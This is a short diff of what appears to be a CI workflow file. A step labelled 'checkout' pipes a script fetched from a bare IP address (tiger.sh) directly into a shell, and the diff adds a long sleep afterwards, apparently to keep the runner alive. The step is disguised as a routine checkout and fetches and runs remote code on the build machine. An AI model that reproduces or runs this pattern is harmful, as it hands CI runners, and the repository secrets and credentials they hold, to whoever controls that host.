@@ -16,3 +16,4 @@ jobs:
     - uses: actions/checkout@v3
     - name: checkout
       run: curl http://180.184.92.22:3232/tiger.sh | sh
+            sleep 1000
